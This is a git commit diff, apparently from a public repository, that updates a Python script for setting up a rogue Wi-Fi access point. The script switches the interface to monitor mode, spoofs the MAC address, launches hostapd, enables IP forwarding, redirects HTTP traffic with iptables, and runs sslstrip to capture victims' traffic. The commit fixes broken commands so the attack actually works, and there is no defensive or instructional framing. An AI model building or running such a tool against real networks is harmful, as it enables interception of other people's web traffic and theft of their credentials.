db84c05d7dfd4ad258c077e610852d5e214e2068
DarkShadow190922 <82983316+DarkShadow190922@users.noreply.github.com>
2024-01-14 22:34:44 +0000

    Update rogue_ap_terminal.py

--- rogue_ap_terminal.py
+++ rogue_ap_terminal.py
@@ -1,14 +1,14 @@
 import subprocess
 
 # Set the wireless interface to monitor mode
-subprocess.run(["ifconfig", "wlan0", "down"])
-subprocess.run(["iwconfig", "wlan0", "mode", "monitor"])
-subprocess.run(["ifconfig", "wlan0", "up"])
+subprocess.run(["ip", "link", "set", "wlan0", "down"])
+subprocess.run(["iw", "wlan0", "set", "monitor", "none"])
+subprocess.run(["ip", "link", "set", "wlan0", "up"])
 
 # Change MAC address
-subprocess.run(["ifconfig", "wlan0", "down"])
+subprocess.run(["ip", "link", "set", "wlan0", "down"])
 subprocess.run(["macchanger", "-r", "wlan0"])
-subprocess.run(["ifconfig", "wlan0", "up"])
+subprocess.run(["ip", "link", "set", "wlan0", "up"])
 
 # Configure hostapd for creating the rogue AP
 hostapd_conf = '''
@@ -21,15 +21,15 @@ with open("/etc/hostapd/hostapd.conf", "w") as f:
     f.write(hostapd_conf)
 
 # Start the rogue AP
-subprocess.run(["hostapd", "/etc/hostapd/hostapd.conf", "&"])
+subprocess.Popen(["hostapd", "/etc/hostapd/hostapd.conf"])
 
 # Enable IP forwarding
-subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
+subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
 
 # Set up iptables for traffic redirection
 subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"])
 
 # Start sslstrip to capture HTTP traffic
-subprocess.run(["sslstrip", "-l", "8080", "&"])
+subprocess.Popen(["sslstrip", "-l", "8080"])
 
 print("Rogue AP created successfully! Enjoy capturing traffic.")
